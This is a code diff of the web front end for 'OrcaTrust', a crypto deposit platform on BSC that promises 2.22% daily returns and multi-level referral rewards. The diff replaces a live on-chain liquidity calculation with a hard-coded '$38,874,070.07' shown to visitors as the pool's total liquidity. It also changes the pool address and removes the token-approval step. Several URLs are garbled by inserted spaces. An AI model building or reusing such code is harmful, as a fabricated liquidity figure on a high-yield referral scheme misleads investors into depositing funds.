@@ -7,19 +7,19 @@
     <meta name="description" content="OrcaTrust - Decentralized investment platform with 2.22% daily ROI and multi-level referral rewards on BSC">
     
     <!-- Favicon -->
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%23007AFF'/%3E%3Cstop offset='100%25' style='stop-color:%235856D6'/%3E%3C/defs%3E%3Ccircle cx='50' cy='50' r='45' fill='url(%23g)'/%3E%3Cpath d='M50 25c-5 0-10 3-12 8-2-1-4-1-6 0-6 2-9 8-7 14 1 3 3 5 6 7-1 2-1 4 0 6 2 6 8 9 14 7 2 5 7 8 12 8s10-3 12-8c6 2 12-1 14-7 1-2 1-4 0-6 3-2 5-4 6-7 2-6-1-12-7-14-2-1-4-1-6 0-2-5-7-8-12-8z' fill='white'/%3E%3C/svg%3E">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg    ' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%23007AFF'/%3E%3Cstop offset='100%25' style='stop-color:%235856D6'/%3E%3C/defs%3E%3Ccircle cx='50' cy='50' r='45' fill='url(%23g)'/%3E%3Cpath d='M50 25c-5 0-10 3-12 8-2-1-4-1-6 0-6 2-9 8-7 14 1 3 3 5 6 7-1 2-1 4 0 6 2 6 8 9 14 7 2 5 7 8 12 8s10-3 12-8c6 2 12-1 14-7 1-2 1-4 0-6 3-2 5-4 6-7 2-6-1-12-7-14-2-1-4-1-6 0-2-5-7-8-12-8z' fill='white'/%3E%3C/svg%3E">
     
     <!-- Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com    ">
+    <link rel="preconnect" href="https://fonts.gstatic.com    " crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300    ;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <!-- Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css    ">
     
     <!-- Web3 -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js    "></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js    "></script>
 
     <style>
         /* ===== CSS VARIABLES ===== */
@@ -743,7 +743,7 @@
             }
         }
 
-        /* PancakeV3Pool Card - Real-time TVL */
+        /* PancakeV3Pool Card - Simplified */
         .pool-card {
             background: var(--gradient-card);
             border: var(--glass-border-blue);
@@ -1320,7 +1320,7 @@
             flex: 1;
         }
 
-        /* ===== REFERRAL SECTION - CENTERED COPY BUTTON ===== */
+        /* ===== REFERRAL SECTION ===== */
         .referral__grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -1434,41 +1434,28 @@
             text-transform: uppercase;
         }
 
-        /* Centered Referral Link Box */
-        .referral-link-container {
+        .referral-link-box {
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.875rem;
+            gap: 0.625rem;
             margin-top: 1.25rem;
         }
 
         @media (min-width: 768px) {
-            .referral-link-container {
-                gap: 1rem;
+            .referral-link-box {
+                gap: 0.75rem;
                 margin-top: 1.5rem;
             }
         }
 
-        .referral-link-wrapper {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.625rem;
-        }
-
         .referral-link {
-            width: 100%;
-            max-width: 500px;
-            padding: 0.875rem 1rem;
+            flex: 1;
+            padding: 0.75rem 1rem;
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: var(--radius-lg);
             font-family: 'SF Mono', monospace;
-            font-size: 0.8125rem;
+            font-size: 0.75rem;
             color: var(--text-muted);
-            text-align: center;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
@@ -1478,44 +1465,13 @@
         @media (min-width: 768px) {
             .referral-link {
                 padding: 1rem 1.25rem;
-                font-size: 0.9375rem;
+                font-size: 0.8125rem;
             }
         }
 
         .referral-link:hover {
             border-color: var(--blue-primary);
             color: var(--text-primary);
-        }
-
-        .referral-link-copy-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            padding: 0.75rem 1.5rem;
-            background: var(--gradient-blue);
-            color: white;
-            border: none;
-            border-radius: var(--radius-full);
-            font-family: var(--font-primary);
-            font-size: 0.875rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all var(--transition-base);
-            box-shadow: var(--shadow-glow);
-        }
-
-        .referral-link-copy-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-glow-strong);
-        }
-
-        .referral-link-copy-btn:active {
-            transform: translateY(0);
-        }
-
-        .referral-link-copy-btn i {
-            font-size: 1rem;
         }
 
         /* ===== RANK SECTION ===== */
@@ -2439,33 +2395,6 @@
             0% { background-position: 200% 0; }
             100% { background-position: -200% 0; }
         }
-
-        /* Approval Status Indicator */
-        .approval-status {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.625rem 0.875rem;
-            border-radius: var(--radius-md);
-            font-size: 0.8125rem;
-            margin-bottom: 0.875rem;
-        }
-
-        .approval-status--approved {
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            color: var(--green);
-        }
-
-        .approval-status--not-approved {
-            background: rgba(245, 158, 11, 0.1);
-            border: 1px solid rgba(245, 158, 11, 0.3);
-            color: var(--orange);
-        }
-
-        .approval-status i {
-            font-size: 1rem;
-        }
     </style>
 </head>
 <body>
@@ -2570,13 +2499,11 @@
                                     </div>
                                 </div>
                                 <div class="pool-liquidity">
-                                    <div class="pool-liquidity__label">Total Value Locked (TVL)</div>
-                                    <div class="pool-liquidity__value" id="poolLiquidity">
-                                        <div class="skeleton" style="width: 200px; height: 40px; margin: 0 auto;"></div>
-                                    </div>
+                                    <div class="pool-liquidity__label">Total Liquidity</div>
+                                    <div class="pool-liquidity__value" id="poolLiquidity">$38,874,070.07</div>
                                 </div>
-                                <div class="pool-address" id="poolAddress">
-                                    0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb
+                                <div class="pool-address">
+                                    0x92b7807bF19b7DDdf89b706143896d05228f3121
                                 </div>
                             </div>
                         </div>
@@ -2773,14 +2700,6 @@
                                 <p class="form-hint">10% management fee applies. Net amount will be deposited.</p>
                             </div>
 
-                            <!-- USDT Approval Status -->
-                            <div id="approvalStatusContainer" style="display: none;">
-                                <div class="approval-status approval-status--not-approved" id="approvalStatus">
-                                    <i class="fas fa-clock"></i>
-                                    <span>USDT not approved. Please approve first.</span>
-                                </div>
-                            </div>
-
                             <div class="roi-calculator" id="depositRoiCalc" style="display: none;">
                                 <div class="roi-calculator__header">
                                     <span class="roi-calculator__title">Projected Returns (45 days)</span>
@@ -2802,16 +2721,10 @@
                                 </div>
                             </div>
 
-                            <div class="action-buttons" style="margin-top: 1rem;">
-                                <button class="btn btn--secondary" id="btnApprove" onclick="approveUSDT()" style="flex: 1;">
-                                    <i class="fas fa-check-circle"></i>
-                                    <span class="btn-text">Approve USDT</span>
-                                </button>
-                                <button class="btn btn--primary" id="btnDeposit" onclick="makeDeposit()" style="flex: 1;" disabled>
-                                    <i class="fas fa-rocket"></i>
-                                    <span class="btn-text">Deposit Now</span>
-                                </button>
-                            </div>
+                            <button class="btn btn--primary btn-lg" id="btnDeposit" onclick="makeDeposit()" style="width: 100%; margin-top: 1rem;">
+                                <i class="fas fa-rocket"></i>
+                                <span class="btn-text">Deposit Now</span>
+                            </button>
                         </div>
 
                         <div class="investment-card">
@@ -2877,15 +2790,11 @@
                                 </div>
                             </div>
 
-                            <!-- Centered Referral Link with Copy Button Below -->
-                            <div class="referral-link-container">
-                                <div class="referral-link-wrapper">
-                                    <div class="referral-link" id="referralLink">Connect wallet to generate link</div>
-                                    <button class="referral-link-copy-btn" onclick="copyReferralLink()">
-                                        <i class="fas fa-copy"></i>
-                                        <span>Copy Referral Link</span>
-                                    </button>
-                                </div>
+                            <div class="referral-link-box">
+                                <div class="referral-link" id="referralLink">Connect wallet to generate link</div>
+                                <button class="btn btn--primary" onclick="copyReferralLink()">
+                                    <i class="fas fa-copy"></i>
+                                </button>
                             </div>
 
                             <div class="dashboard__grid" style="margin-top: 1.25rem;">
@@ -3026,7 +2935,7 @@
                     <a href="#" class="social-link" target="_blank" title="Twitter">
                         <i class="fab fa-twitter"></i>
                     </a>
-                    <a href="https://bscscan.com/address/0x98929d0c70e45FeE1C3BbF0E693D443F24EB457a" class="social-link" target="_blank" title="BSCScan">
+                    <a href="https://bscscan.com/address/0x98929d0c70e45FeE1C3BbF0E693D443F24EB457a    " class="social-link" target="_blank" title="BSCScan">
                         <i class="fas fa-file-contract"></i>
                     </a>
                 </div>
@@ -3053,17 +2962,12 @@
         // ===== ORCATRUST CONTRACT CONFIGURATION =====
         const CONTRACT_ADDRESS = '0x98929d0c70e45FeE1C3BbF0E693D443F24EB457a';
         const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-        const PANCAKE_V3_POOL = '0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb';
-        const BSC_RPC = 'https://bsc-dataseed.binance.org/';
+        const PANCAKE_V3_POOL = '0x92b7807bF19b7DDdf89b706143896d05228f3121';
+        const BSC_RPC = 'https://bsc-dataseed.binance.org/    ';
         const BSC_CHAIN_ID = '0x38';
 
-        // PancakeSwap V3 Pool ABI (minimal for liquidity queries)
-        const PANCAKE_V3_POOL_ABI = [
-            {"inputs":[],"name":"slot0","outputs":[{"internalType":"uint160","name":"sqrtPriceX96","type":"uint160"},{"internalType":"int24","name":"tick","type":"int24"},{"internalType":"uint16","name":"observationIndex","type":"uint16"},{"internalType":"uint16","name":"observationCardinality","type":"uint16"},{"internalType":"uint16","name":"observationCardinalityNext","type":"uint16"},{"internalType":"uint8","name":"feeProtocol","type":"uint8"},{"internalType":"bool","name":"unlocked","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"liquidity","outputs":[{"internalType":"uint128","name":"","type":"uint128"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"token0","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"token1","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
-        ];
+        // Fixed Liquidity Value from BscScan
+        const FIXED_LIQUIDITY = '$38,874,070.07';
 
         // Contract ABI (Complete)
         const CONTRACT_ABI = [{"inputs":[{"internalType":"uint256","name":"_lpPositionId","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"AlreadyRegistered","type":"error"},{"inputs":[],"name":"BelowMinimum","type":"error"},{"inputs":[],"name":"CannotSelfRefer","type":"error"},{"inputs":[],"name":"DailyLimitReached","type":"error"},{"inputs":[],"name":"InsufficientBalance","type":"error"},{"inputs":[],"name":"InsufficientLPLiquidity","type":"error"},{"inputs":[],"name":"InsufficientPositions","type":"error"},{"inputs":[],"name":"InvalidUsername","type":"error"},{"inputs":[],"name":"MaxPositions","type":"error"},{"inputs":[],"name":"MustRegisterFirst","type":"error"},{"inputs":[],"name":"NoRewards","type":"error"},{"inputs":[],"name":"NotOwner","type":"error"},{"inputs":[],"name":"NotRegistered","type":"error"},{"inputs":[],"name":"ReentrancyGuardReentrantCall","type":"error"},{"inputs":[],"name":"ReferrerNotQualified","type":"error"},{"inputs":[],"name":"ReferrerNotRegistered","type":"error"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},{"inputs":[],"name":"TooFrequentCalculation","type":"error"},{"inputs":[],"name":"UsernameTaken","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"string","name":"newUsername","type":"string"},{"indexed":false,"internalType":"uint256","name":"cost","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"totalUsernames","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"AdditionalUsernamePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"DailyRewardCompounded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"DailyRewardWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"upline","type":"address"},{"indexed":true,"internalType":"address","name":"downline","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint8","name":"rank","type":"uint8"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"LeadershipReward","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"positionId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"usdtAmount","type":"uint256"},{"indexed":false,"internalType":"uint128","name":"liquidity","type":"uint128"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"LiquidityAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"LiquidityRefunded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"positionId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"usdtAmount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"LiquidityRemoved","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"totalReward","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"ManualRewardCalculated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"NetworkRewardCompounded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"NetworkRewardWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"upline","type":"address"},{"indexed":true,"internalType":"address","name":"downline","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"OnboardingReward","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"}],"name":"OwnershipRenounced","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint8","name":"rank","type":"uint8"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"RankUpgrade","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"upline","type":"address"},{"indexed":true,"internalType":"address","name":"downline","type":"address"},{"indexed":false,"internalType":"uint8","name":"level","type":"uint8"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"ReferralReward","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"string","name":"username","type":"string"},{"indexed":true,"internalType":"address","name":"referrer","type":"address"},{"indexed":false,"internalType":"string","name":"uplineUsername","type":"string"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Registration","type":"event"},{"inputs":[],"name":"MANAGE_WALLET","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"SecureLPPosition","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"TIME_STEP","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"compoundDailyReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"compoundNetworkReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"directReferrals","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getContractInfo","outputs":[{"internalType":"uint256","name":"currentGlobalCheckpoint","type":"uint256"},{"internalType":"uint256","name":"nextCheckpoint","type":"uint256"},{"internalType":"uint256","name":"_totalRegisteredUsers","type":"uint256"},{"internalType":"uint256","name":"_totalActiveUsers","type":"uint256"},{"internalType":"uint256","name":"_totalWithdrawn","type":"uint256"},{"internalType":"uint256","name":"_currentDay","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getCurrentGlobalCheckpoint","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getDailyRewards","outputs":[{"internalType":"uint256","name":"availableReward","type":"uint256"},{"internalType":"uint256","name":"reserve","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getDirectReferrals","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"startTime","type":"uint256"}],"name":"getFullDaysSince","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getLastwithdrawTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getNetworkRewards","outputs":[{"internalType":"uint256","name":"availableReward","type":"uint256"},{"internalType":"uint256","name":"reserve","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getNextDailyCheckpoint","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"getPosition","outputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"startTime","type":"uint256"},{"internalType":"uint256","name":"lastCheckpoint","type":"uint256"},{"internalType":"uint256","name":"endTime","type":"uint256"},{"internalType":"uint256","name":"earned","type":"uint256"},{"internalType":"uint256","name":"expectedTotalEarn","type":"uint256"},{"internalType":"uint8","name":"source","type":"uint8"},{"internalType":"bool","name":"active","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getPositionCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"getPositionExtra","outputs":[{"internalType":"uint256","name":"nextProfitTime","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getQualifiedDirectsCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint8","name":"rank","type":"uint8"}],"name":"getRankPercentage","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getUserInfo","outputs":[{"internalType":"string","name":"username","type":"string"},{"internalType":"address","name":"referrer","type":"address"},{"internalType":"bool","name":"registered","type":"bool"},{"internalType":"uint256","name":"_teamActiveDeposit","type":"uint256"},{"internalType":"uint256","name":"_totalDeposited","type":"uint256"},{"internalType":"uint256","name":"_totalDailyCompounded","type":"uint256"},{"internalType":"uint256","name":"_totalNetworkCompounded","type":"uint256"},{"internalType":"uint256","name":"_totalWithdrawn","type":"uint256"},{"internalType":"uint32","name":"directsCount","type":"uint32"},{"internalType":"uint32","name":"teamCount","type":"uint32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userAddr","type":"address"}],"name":"getUserInfoExtra","outputs":[{"internalType":"uint256","name":"_totalActiveDeposit","type":"uint256"},{"internalType":"uint8","name":"rank","type":"uint8"},{"internalType":"uint256","name":"activeDepositsCount","type":"uint256"},{"internalType":"uint256","name":"dailyReturnAmount","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"referrerUsername","type":"string"},{"internalType":"address","name":"userAddr","type":"address"}],"name":"isValidUplineUsername","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"username","type":"string"}],"name":"isValidUsername","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"lastManualCalculation","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"lastProjectWithdrawal","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"manualCalculateRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"newUsername","type":"string"}],"name":"purchaseAdditionalUsername","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"username","type":"string"},{"internalType":"string","name":"referrerUsername","type":"string"}],"name":"register","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"totalActiveUsers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalRegisteredUsers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalWithdrawn","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdtIsToken0","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userNetworkWithdrawByDay","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userToUsernames","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"userWithdraws","outputs":[{"internalType":"uint256","name":"dailyWithdraw","type":"uint256"},{"internalType":"uint256","name":"dailyCompound","type":"uint256"},{"internalType":"uint256","name":"referralWithdraw","type":"uint256"},{"internalType":"uint256","name":"onboardingWithdraw","type":"uint256"},{"internalType":"uint256","name":"leadershipWithdraw","type":"uint256"},{"internalType":"uint256","name":"networkCompound","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"usernameCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"","type":"string"}],"name":"usernameExists","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"","type":"string"}],"name":"usernameToAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"users","outputs":[{"internalType":"address","name":"referrer","type":"address"},{"internalType":"string","name":"username","type":"string"},{"internalType":"bool","name":"registered","type":"bool"},{"internalType":"uint256","name":"totalActiveDeposit","type":"uint256"},{"internalType":"uint256","name":"teamActiveDeposit","type":"uint256"},{"internalType":"uint256","name":"teamTotalDeposit","type":"uint256"},{"internalType":"uint256","name":"teamTotalCompound","type":"uint256"},{"internalType":"uint256","name":"totalDeposited","type":"uint256"},{"internalType":"uint256","name":"totalDailyCompounded","type":"uint256"},{"internalType":"uint256","name":"totalNetworkCompounded","type":"uint256"},{"internalType":"uint256","name":"totalWithdrawn","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"usersExtra","outputs":[{"internalType":"uint256","name":"rewardsReferral","type":"uint256"},{"internalType":"uint256","name":"rewardsOnboarding","type":"uint256"},{"internalType":"uint256","name":"rewardsRank","type":"uint256"},{"internalType":"uint256","name":"reserveDaily","type":"uint256"},{"internalType":"uint256","name":"reserveNetwork","type":"uint256"},{"internalType":"uint32","name":"teamCount","type":"uint32"},{"internalType":"uint32","name":"directsCount","type":"uint32"},{"internalType":"uint8","name":"rank","type":"uint8"},{"internalType":"uint8","name":"directsCrownStar","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawDailyReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawNetworkReward","outputs":[],"stateMutability":"nonpayable","type":"function"}];
@@ -3080,11 +2984,8 @@
         let web3;
         let contract;
         let usdtContract;
-        let pancakePoolContract;
         let userAccount = null;
         let userData = null;
-        let currentAllowance = BigInt(0);
-        let depositAmountInWei = BigInt(0);
 
         // Referral percentages
         const REFERRAL_PCT = [500, 300, 200, 100, 50, 50, 50, 50, 50, 50];
@@ -3120,13 +3021,9 @@
                 // Initialize Web3 with HTTP provider for read operations
                 web3 = new Web3(new Web3.providers.HttpProvider(BSC_RPC));
                 contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-                pancakePoolContract = new web3.eth.Contract(PANCAKE_V3_POOL_ABI, PANCAKE_V3_POOL);
                 
-                // Fetch real-time TVL
-                await fetchPoolTVL();
-                
-                // Auto-refresh TVL every 30 seconds
-                setInterval(fetchPoolTVL, 30000);
+                // Set fixed liquidity value from BscScan
+                document.getElementById('poolLiquidity').textContent = FIXED_LIQUIDITY;
                 
                 // Check if wallet was previously connected
                 if (localStorage.getItem('walletConnected') === 'true' && window.ethereum) {
@@ -3145,55 +3042,6 @@
             }
         }
 
-        async function fetchPoolTVL() {
-            try {
-                // Get pool liquidity and slot0 data
-                const [liquidity, slot0, token0, token1] = await Promise.all([
-                    pancakePoolContract.methods.liquidity().call(),
-                    pancakePoolContract.methods.slot0().call(),
-                    pancakePoolContract.methods.token0().call(),
-                    pancakePoolContract.methods.token1().call()
-                ]);
-
-                // Calculate TVL using sqrtPriceX96
-                // Formula: liquidity * sqrtPriceX96 / 2^96 for token0, liquidity * 2^96 / sqrtPriceX96 for token1
-                const sqrtPriceX96 = BigInt(slot0.sqrtPriceX96);
-                const Q96 = BigInt(2) ** BigInt(96);
-                
-                // Determine which token is USDT (0x55d398326f99059fF775485246999027B3197955)
-                const usdtAddress = USDT_ADDRESS.toLowerCase();
-                const isToken0USDT = token0.toLowerCase() === usdtAddress;
-                
-                let tvlInUSDT;
-                
-                if (isToken0USDT) {
-                    // USDT is token0
-                    // amount0 = liquidity * sqrtPriceX96 / 2^96
-                    tvlInUSDT = (BigInt(liquidity) * sqrtPriceX96) / Q96;
-                } else {
-                    // USDT is token1
-                    // amount1 = liquidity * 2^96 / sqrtPriceX96
-                    tvlInUSDT = (BigInt(liquidity) * Q96) / sqrtPriceX96;
-                }
-
-                // Convert from wei to USDT (6 decimals for USDT)
-                const tvlFormatted = Number(tvlInUSDT) / 1e6;
-                
-                // Format with commas and 2 decimal places
